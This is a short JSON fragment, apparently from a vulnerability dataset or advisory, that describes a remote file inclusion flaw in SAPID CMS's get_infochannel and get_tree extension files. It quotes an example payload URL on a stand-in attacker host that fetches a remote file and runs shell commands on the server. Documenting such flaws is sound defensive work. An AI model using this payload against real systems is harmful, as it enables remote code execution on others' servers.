      "required_capabilities": "The attacker needs to be able to send HTTP requests to the vulnerable application and have access to a server where malicious code can be hosted. No authentication is needed.",
       "details": "The vulnerability is located in `usr/extensions/get_infochannel.inc.php` (lines 8-9) and `usr/extensions/get_tree.inc.php` (lines 9-10). These files use `include()` with user controlled variables to load files. By supplying a remote URL in the `root_path` parameter, an attacker can include a malicious file located on an external server. The provided exploit examples demonstrate this by using `http://attacker/cmd.txt?cmd=id;pwd` as the malicious file, which would execute the commands 'id' and 'pwd' on the server running SAPID CMS, and return the output."
